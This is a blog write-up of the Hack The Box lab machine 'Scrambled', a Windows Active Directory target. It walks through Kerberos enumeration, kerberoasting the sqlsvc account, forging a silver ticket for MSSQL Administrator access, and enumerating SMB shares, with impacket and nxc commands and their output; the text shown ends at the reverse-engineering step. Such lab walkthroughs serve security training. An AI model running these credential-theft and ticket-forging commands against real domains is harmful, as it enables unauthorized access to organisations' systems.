<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Scrambled (Windows Medium) | SidePieceVillage</title><meta name="author" content="Jay"><meta name="copyright" content="Jay"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Scrambled is a Medium Windows Active Directory machine. Enumerating the website hosted on the remote machine a potential attacker is able to deduce the credentials for the user ksimpson. On the websit">
<meta property="og:type" content="article">
<meta property="og:title" content="Scrambled (Windows Medium)">
<meta property="og:url" content="https://d34db33fb04h.github.io/2025/04/01/Scrambled/index.html">
<meta property="og:site_name" content="SidePieceVillage">
<meta property="og:description" content="Scrambled is a Medium Windows Active Directory machine. Enumerating the website hosted on the remote machine a potential attacker is able to deduce the credentials for the user ksimpson. On the websit">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://d34db33fb04h.github.io/img/scrambled.png">
<meta property="article:published_time" content="2025-04-01T14:14:37.000Z">
<meta property="article:modified_time" content="2025-04-01T17:37:11.625Z">
<meta property="article:author" content="Jay">
<meta property="article:tag" content="SMB">
<meta property="article:tag" content="kerberoasting SPNs">
<meta property="article:tag" content="silver ticket">
<meta property="article:tag" content="mssql">
<meta property="article:tag" content=".NET">
<meta property="article:tag" content="Source Code Analysis">
<meta property="article:tag" content="Deserialization">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://d34db33fb04h.github.io/img/scrambled.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Scrambled (Windows Medium)",
  "url": "https://d34db33fb04h.github.io/2025/04/01/Scrambled/",
  "image": "https://d34db33fb04h.github.io/img/scrambled.png",
  "datePublished": "2025-04-01T14:14:37.000Z",
  "dateModified": "2025-04-01T17:37:11.625Z",
  "author": [
    {
      "@type": "Person",
      "name": "Jay",
      "url": "https://d34db33fb04h.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/j-neon-oval.png"><link rel="canonical" href="https://d34db33fb04h.github.io/2025/04/01/Scrambled/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: true,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Scrambled (Windows Medium)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><script>window.paceOptions = {
  restartOnPushState: false
}

btf.addGlobalFn('pjaxSend', () => {
  Pace.restart()
}, 'pace_restart')

</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/hacking-crook.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">28</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://app.hackthebox.com/profile/420575"><i class="fa-fw fas fa-rss"></i><span> HTB</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/n8.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/j-neon-oval.png" alt="Logo"><span class="site-name">SidePieceVillage</span></a><a class="nav-page-title" href="/"><span class="site-name">Scrambled (Windows Medium)</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://app.hackthebox.com/profile/420575"><i class="fa-fw fas fa-rss"></i><span> HTB</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Scrambled (Windows Medium)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-04-01T14:14:37.000Z" title="Created 2025-04-01 09:14:37">2025-04-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-04-01T17:37:11.625Z" title="Updated 2025-04-01 12:37:11">2025-04-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/htb/">htb</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>Scrambled is a Medium Windows Active Directory machine. Enumerating the website hosted on the remote machine a potential attacker is able to deduce the credentials for the user <code>ksimpson</code>. On the website, it is also stated that NTLM authentication is disabled meaning that Kerberos authentication is to be used. Accessing the <code>Public</code> share with the credentials of <code>ksimpson</code>, a PDF file states that an attacker retrieved the credentials of an SQL database. This is a hint that there is an SQL service running on the remote machine. Enumerating the normal user accounts, it is found that the account <code>SqlSvc</code> has a <code>Service Principal Name</code> (SPN) associated with it. An attacker can use this information to perform an attack that is knows as <code>kerberoasting</code> and get the hash of <code>SqlSvc</code>. After cracking the hash and acquiring the credentials for the <code>SqlSvc</code> account an attacker can perform a <code>silver ticket</code> attack to forge a ticket and impersonate the user <code>Administrator</code> on the remote MSSQL service. Enumeration of the database reveals the credentials for user <code>MiscSvc</code>, which can be used to enumerate shares finding <code>IT</code> share readable. Looking at the files found from the share, reveals a <code>.NET</code> application, which is listening on port <code>4411</code>. Reverse engineering the application reveals that it is using the insecure <code>Binary Formatter</code> class to transmit data, allowing the attacker to upload their own payload and get code execution as <code>nt authority\system</code>. </p>
<h2 id="Initial-Nmap"><a href="#Initial-Nmap" class="headerlink" title="Initial Nmap"></a>Initial Nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-01 14:18:04Z)</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC </span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn </span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name) </span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127   </span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127 </span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 </span><br><span class="line">636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)</span><br><span class="line">1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000 </span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name) </span><br><span class="line">4411/tcp  open  found?        syn-ack ttl 127</span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC </span><br><span class="line">49700/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49706/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                                  </span><br><span class="line">60880/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                 </span><br></pre></td></tr></table></figure>
<h2 id="Port-4411"><a href="#Port-4411" class="headerlink" title="Port 4411"></a>Port 4411</h2><p>Seems to be a custom app maybe?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ telnet 10.10.11.168 4411                                                            </span><br><span class="line">Trying 10.10.11.168...</span><br><span class="line">Connected to 10.10.11.168.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line">SCRAMBLECORP_ORDERS_V1.0.3;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>We’ll can come back later.</p>
<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>User found from website <code>ksimpson</code>. Looking at the password reset page, in short they are changing the password to the username. </p>
<p><img src="/img/ksimpson.png"></p>
<h2 id="SMB-Authenticating-Through-Kerberos"><a href="#SMB-Authenticating-Through-Kerberos" class="headerlink" title="SMB (Authenticating Through Kerberos)"></a>SMB (Authenticating Through Kerberos)</h2><p>Using kerberos to check if user is valid with the FQDN.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb dc1.scrm.local -k -u ksimpson -p ksimpson                </span><br><span class="line">SMB         dc1.scrm.local  445    dc1              [*]  x64 (name:dc1) (domain:scrm.local) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         dc1.scrm.local  445    dc1              [+] scrm.local\ksimpson:ksimpson</span><br></pre></td></tr></table></figure>
<p>We can look at shares.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb dc1.scrm.local -k -u ksimpson -p ksimpson --shares</span><br><span class="line">SMB         dc1.scrm.local  445    dc1              [*]  x64 (name:dc1) (domain:scrm.local) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         dc1.scrm.local  445    dc1              [+] scrm.local\ksimpson:ksimpson </span><br><span class="line">SMB         dc1.scrm.local  445    dc1              [*] Enumerated shares</span><br><span class="line">SMB         dc1.scrm.local  445    dc1              Share           Permissions     Remark</span><br><span class="line">SMB         dc1.scrm.local  445    dc1              -----           -----------     ------</span><br><span class="line">SMB         dc1.scrm.local  445    dc1              ADMIN$                          Remote Admin</span><br><span class="line">SMB         dc1.scrm.local  445    dc1              C$                              Default share</span><br><span class="line">SMB         dc1.scrm.local  445    dc1              HR                              </span><br><span class="line">SMB         dc1.scrm.local  445    dc1              IPC$            READ            Remote IPC</span><br><span class="line">SMB         dc1.scrm.local  445    dc1              IT                              </span><br><span class="line">SMB         dc1.scrm.local  445    dc1              NETLOGON        READ            Logon server share </span><br><span class="line">SMB         dc1.scrm.local  445    dc1              Public          READ            </span><br><span class="line">SMB         dc1.scrm.local  445    dc1              Sales                           </span><br><span class="line">SMB         dc1.scrm.local  445    dc1              SYSVOL          READ            Logon server share</span><br></pre></td></tr></table></figure>
<p>Looking at them with smbclient, Public is the only interesting one we can read.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbclient &#x27;scrm.local/ksimpson:ksimpson@dc1.scrm.local&#x27; -k -no-pass</span><br><span class="line">Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">Type help for list of commands</span><br><span class="line"># use Public</span><br><span class="line"># ls</span><br><span class="line">drw-rw-rw-          0  Thu Nov  4 17:23:19 2021 .</span><br><span class="line">drw-rw-rw-          0  Thu Nov  4 17:23:19 2021 ..</span><br><span class="line">-rw-rw-rw-     630106  Fri Nov  5 12:45:07 2021 Network Security Changes.pdf</span><br></pre></td></tr></table></figure>
<p>Upon grabbing and reading we see that there was a previous attack where an attacker targeted SQL. We will try that soon enough!<br><img src="/img/kerb.png"></p>
<h2 id="Kerberoasting-cuz-We-care"><a href="#Kerberoasting-cuz-We-care" class="headerlink" title="Kerberoasting cuz We care!!"></a>Kerberoasting cuz We care!!</h2><p>Looking at what SPNs are running under our user we find MSSQL associated with our user.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ GetUserSPNs.py -dc-host dc1.scrm.local -k &#x27;scrm.local/ksimpson:ksimpson&#x27;</span><br><span class="line">Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation </span><br><span class="line">----------------------------  ------  --------  --------------------------  --------------------------  ----------</span><br><span class="line">MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 11:32:02.351452  2025-03-30 19:26:14.609217             </span><br><span class="line">MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 11:32:02.351452  2025-03-30 19:26:14.609217</span><br></pre></td></tr></table></figure>
<p>We can request these and the try to crack. Which this gives a cleartext password for the <code>svcsql</code> account.  </p>
<h2 id="Silver-Ticket-Attacks"><a href="#Silver-Ticket-Attacks" class="headerlink" title="Silver Ticket Attacks"></a>Silver Ticket Attacks</h2><p>MSSQL is running, so we can forge a silver ticket and connect as the Administrator of the instance.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ ticketer.py -nthash B990006500B87D000C70000A6877000 -domain-sid &#x27;S-1-5-21-2743207045-1827831105-2542523200&#x27; -user &#x27;sqlsvc&#x27; -domain &#x27;scrm.local&#x27; -spn &#x27;MSSQL//dc1.scrm.local:1433&#x27; -user-id &#x27;500&#x27; Administrator</span><br><span class="line">Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Creating basic skeleton ticket and PAC Infos</span><br><span class="line">[*] Customizing ticket for scrm.local/Administrator</span><br><span class="line">[*]     PAC_LOGON_INFO</span><br><span class="line">[*]     PAC_CLIENT_INFO_TYPE</span><br><span class="line">[*]     EncTicketPart</span><br><span class="line">[*]     EncTGSRepPart</span><br><span class="line">[*] Signing/Encrypting final ticket</span><br><span class="line">[*]     PAC_SERVER_CHECKSUM</span><br><span class="line">[*]     PAC_PRIVSVR_CHECKSUM</span><br><span class="line">[*]     EncTicketPart</span><br><span class="line">[*]     EncTGSRepPart</span><br><span class="line">[*] Saving ticket in Administrator.ccache</span><br></pre></td></tr></table></figure>
<p><img src="/img/tickets.gif"></p>
<p>Then we can export and connect to the MSSQL instance.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ export KRB5CCNAME=Administrator.ccache</span><br><span class="line">$ impacket-mssqlclient -dc-ip 10.10.11.168 &#x27;scrm.local/Administrator@dc1.scrm.local&#x27; -k -no-pass -debug</span><br><span class="line">Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[+] Impacket Library Installation Path: /usr/local/lib/python3.11/dist-packages/impacket-0.13.0.dev0+20241024.90011.835e1755-py3.11.egg/impacket</span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[+] Using Kerberos Cache: Administrator.ccache</span><br><span class="line">[+] SPN MSSQLSVC/:1433@SCRM.LOCAL not found in cache</span><br><span class="line">[+] AnySPN is True, looking for another suitable SPN</span><br><span class="line">[+] Returning cached credential for MSSQL/@SCRM.LOCAL</span><br><span class="line">[+] Using TGS from cache</span><br><span class="line">[+] Changing sname from MSSQL/@SCRM.LOCAL to MSSQLSVC/:1433@SCRM.LOCAL and hoping for the best</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(DC1): Line 1: Changed database context to &#x27;master&#x27;.</span><br><span class="line">[*] INFO(DC1): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) </span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">SQL (SCRM\administrator  dbo@master)&gt; </span><br></pre></td></tr></table></figure>
<p>Winner Winner SQL Dinner!!!</p>
<h2 id="MSSQL-Through-the-Looking-Glass"><a href="#MSSQL-Through-the-Looking-Glass" class="headerlink" title="MSSQL (Through the Looking Glass)"></a>MSSQL (Through the Looking Glass)</h2><p>We can look through the database real quick to see if anything interesting is lingering about.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">SQL (SCRM\administrator  dbo@master)&gt; select name from sys.databases;                                                                                            </span><br><span class="line">name                                                                                                  </span><br><span class="line">----------   </span><br><span class="line">master</span><br><span class="line"></span><br><span class="line">tempdb</span><br><span class="line"></span><br><span class="line">model</span><br><span class="line"></span><br><span class="line">msdb</span><br><span class="line"></span><br><span class="line">ScrambleHR</span><br><span class="line"></span><br><span class="line">SQL (SCRM\administrator  dbo@master)&gt; use ScrambleHR;</span><br><span class="line">ENVCHANGE(DATABASE): Old Value: master, New Value: ScrambleHR                                                                          </span><br><span class="line">INFO(DC1): Line 1: Changed database context to &#x27;ScrambleHR&#x27;.</span><br><span class="line">SQL (SCRM\administrator  dbo@ScrambleHR)&gt; select name from sys.tables;</span><br><span class="line">name</span><br><span class="line">----------                                                                                            </span><br><span class="line">Employees    </span><br><span class="line"></span><br><span class="line">UserImport                                                          </span><br><span class="line">                                                           </span><br><span class="line">Timesheets                                                          </span><br><span class="line">SQL (SCRM\administrator  dbo@ScrambleHR)&gt; select * from UserImport;</span><br><span class="line">LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   </span><br><span class="line">--------   -----------------   ----------   ---------------   -------------   </span><br><span class="line">MiscSvc    &lt;SNIP&gt;   scrm.local                90               0 </span><br></pre></td></tr></table></figure>
<p><img src="/img/perfect.gif"></p>
<h2 id="SMB-I-See"><a href="#SMB-I-See" class="headerlink" title="SMB I See"></a>SMB I See</h2><p>Using the new credentials we found for <code>MiscSvc</code>, lets look at shares again.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb dc1.scrm.local -k -u MiscSvc -p &lt;SNIP&gt; --shares</span><br><span class="line">SMB         dc1.scrm.local  445    dc1              [*]  x64 (name:dc1) (domain:scrm.local) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         dc1.scrm.local  445    dc1              [+] scrm.local\MiscSvc:&lt;SNIP&gt; </span><br><span class="line">SMB         dc1.scrm.local  445    dc1              [*] Enumerated shares</span><br><span class="line">SMB         dc1.scrm.local  445    dc1              Share           Permissions     Remark</span><br><span class="line">SMB         dc1.scrm.local  445    dc1              -----           -----------     ------</span><br><span class="line">SMB         dc1.scrm.local  445    dc1              ADMIN$                          Remote Admin</span><br><span class="line">SMB         dc1.scrm.local  445    dc1              C$                              Default share</span><br><span class="line">SMB         dc1.scrm.local  445    dc1              HR                              </span><br><span class="line">SMB         dc1.scrm.local  445    dc1              IPC$            READ            Remote IPC</span><br><span class="line">SMB         dc1.scrm.local  445    dc1              IT              READ            </span><br><span class="line">SMB         dc1.scrm.local  445    dc1              NETLOGON        READ            Logon server share </span><br><span class="line">SMB         dc1.scrm.local  445    dc1              Public          READ            </span><br><span class="line">SMB         dc1.scrm.local  445    dc1              Sales                           </span><br><span class="line">SMB         dc1.scrm.local  445    dc1              SYSVOL          READ            Logon server share </span><br></pre></td></tr></table></figure>
<p>We have access to the <code>IT</code> share now. Looking inside we find a custom <code>exe</code> and <code>dll</code> file we can download and look at on our windows VM.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ impacket-smbclient &#x27;scrm.local/MiscSvc:&lt;SNIP&gt;@dc1.scrm.local&#x27; -k -no-pass</span><br><span class="line">Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">Type help for list of commands</span><br><span class="line"># use IT</span><br><span class="line"># ls</span><br><span class="line">drw-rw-rw-          0  Wed Nov  3 14:32:55 2021 .</span><br><span class="line">drw-rw-rw-          0  Wed Nov  3 14:32:55 2021 ..</span><br><span class="line">drw-rw-rw-          0  Wed Nov  3 16:06:32 2021 Apps</span><br><span class="line">drw-rw-rw-          0  Wed Nov  3 14:32:44 2021 Logs</span><br><span class="line">drw-rw-rw-          0  Wed Nov  3 14:32:55 2021 Reports</span><br><span class="line"># cd Apps</span><br><span class="line"># ls</span><br><span class="line">drw-rw-rw-          0  Wed Nov  3 16:06:32 2021 .</span><br><span class="line">drw-rw-rw-          0  Wed Nov  3 16:06:32 2021 ..</span><br><span class="line">drw-rw-rw-          0  Fri Nov  5 15:57:08 2021 Sales Order Client</span><br><span class="line"># cd Sales Order Client</span><br><span class="line"># ls</span><br><span class="line">drw-rw-rw-          0  Fri Nov  5 15:57:08 2021 .</span><br><span class="line">drw-rw-rw-          0  Fri Nov  5 15:57:08 2021 ..</span><br><span class="line">-rw-rw-rw-      86528  Fri Nov  5 15:57:08 2021 ScrambleClient.exe</span><br><span class="line">-rw-rw-rw-      19456  Fri Nov  5 15:57:08 2021 ScrambleLib.dll</span><br><span class="line"># mget *</span><br></pre></td></tr></table></figure>
<h2 id="Dnspying"><a href="#Dnspying" class="headerlink" title="Dnspying"></a>Dnspying</h2><p>After getting the files on our windows VM we can look at them in <a target="_blank" rel="noopener" href="https://github.com/dnSpy/dnSpy">dnspy</a>.</p>
